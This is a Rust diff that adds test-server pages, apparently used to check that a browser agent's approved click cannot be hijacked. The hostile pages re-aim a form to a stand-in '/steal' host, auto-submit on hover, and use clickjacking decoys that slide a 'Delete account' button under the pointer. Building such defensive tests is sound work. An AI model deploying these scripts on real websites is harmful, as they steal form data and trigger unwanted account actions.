@@ -469,6 +469,96 @@ fn route(
              document.getElementById('again').onclick = () => \
              document.getElementById('out').textContent = 'Clicked again'</script>",
         )),
+        // ADR-215 (P-BROWSER-1): pages that try to turn an approved click into something else.
+        // A form re-aimed at another website the moment its button is pressed.
+        ("GET", "/re-aim") => ok(page(
+            "Re-aim",
+            &format!(
+                "<form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
+                 <button type=submit id=go>Send message</button></form>\
+                 <script>document.getElementById('go').onmousedown = () => {{ \
+                 document.getElementById('f').action = 'http://other.test:{port}/steal'; }}</script>"
+            ),
+        )),
+        // The same, re-aimed at another website that is on the owner's allowed list (pay.test),
+        // so the website lists let it through and only the approval's binding stands in the way.
+        ("GET", "/re-aim-allowed") => ok(page(
+            "Re-aim to an allowed website",
+            &format!(
+                "<form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
+                 <button type=submit id=go>Send message</button></form>\
+                 <script>document.getElementById('go').onmousedown = () => {{ \
+                 document.getElementById('f').action = 'http://pay.test:{port}/steal'; }}</script>"
+            ),
+        )),
+        // An honest form that sends to another website (pay.test) from the start: the card names
+        // both, and the approval covers the send.
+        ("GET", "/pay") => ok(page(
+            "Pay elsewhere",
+            &format!(
+                "<form method=post action=\"http://pay.test:{port}/inbox\">\
+                 <input type=hidden name=order value=7>\
+                 <button type=submit id=go>Send message</button></form>"
+            ),
+        )),
+        ("POST", "/inbox") => ok(page("Received", "<p>Your message arrived.</p>")),
+        // The same, re-aimed at another page of the same website.
+        ("GET", "/re-aim-path") => ok(page(
+            "Re-aim within the site",
+            "<form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
+             <button type=submit id=go>Send message</button></form>\
+             <script>document.getElementById('go').onmousedown = () => { \
+             document.getElementById('f').action = '/delete-account'; }</script>",
+        )),
+        ("POST", "/steal") => ok(page("Stolen", "<p>Got it.</p>")),
+        ("POST", "/delete-account") => ok(page("Deleted", "<p>The account is gone.</p>")),
+        // A page that sends its form by itself as soon as the pointer comes near the button;
+        // the button itself does nothing. The button sits lower than on the other pages, so the
+        // pointer (left where the last click was) has to travel to it: the send happens during
+        // the pointer's approach, not as the page loads.
+        ("GET", "/eager") => ok(page(
+            "Eager",
+            "<div style=\"height:260px\"></div>\
+             <form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
+             <button type=button id=go>Send message</button></form>\
+             <script>document.getElementById('go').onmouseover = () => \
+             document.getElementById('f').submit()</script>",
+        )),
+        // A same-site "Delete account" button moved under the pointer: as soon as the pointer
+        // reaches "Send message" (/decoy), 10 ms after that (/decoy-late), or the moment the
+        // mouse button goes down on it (/decoy-press).
+        ("GET", "/decoy") | ("GET", "/decoy-late") | ("GET", "/decoy-press") => {
+            let when = match path {
+                "/decoy-late" => "go.onmouseover = () => setTimeout(move, 10)",
+                "/decoy-press" => "go.onmousedown = move",
+                _ => "go.onmouseover = move",
+            };
+            ok(page(
+                "Decoy",
+                &format!(
+                    "<form method=post action=\"/send\"><input type=hidden name=name value=me>\
+                     <button type=submit id=go>Send message</button></form>\
+                     <form method=post action=\"/delete-account\">\
+                     <button type=submit id=bad style=\"position:fixed;left:600px;top:400px\">\
+                     Delete account</button></form>\
+                     <script>const go = document.getElementById('go'); \
+                     const bad = document.getElementById('bad'); \
+                     const move = () => {{ const r = go.getBoundingClientRect(); \
+                     bad.style.left = r.left + 'px'; bad.style.top = r.top + 'px'; \
+                     bad.style.width = r.width + 'px'; bad.style.height = r.height + 'px'; \
+                     bad.style.zIndex = '10'; }}; {when};</script>"
+                ),
+            ))
+        }
+        // A button whose own script sends a message to this website: the ordinary case, which
+        // must keep working under an approval.
+        ("GET", "/js-send") => ok(page(
+            "Script send",
+            "<p id=out>Ready</p><button type=button id=go>Send message</button>\
+             <script>document.getElementById('go').onclick = () => \
+             fetch('/api/messages', {method: 'POST', body: 'hello'}).then(r => \
+             document.getElementById('out').textContent = 'Sent: ' + r.status)</script>",
+        )),
         _ => (
             "404 Not Found",
             None,
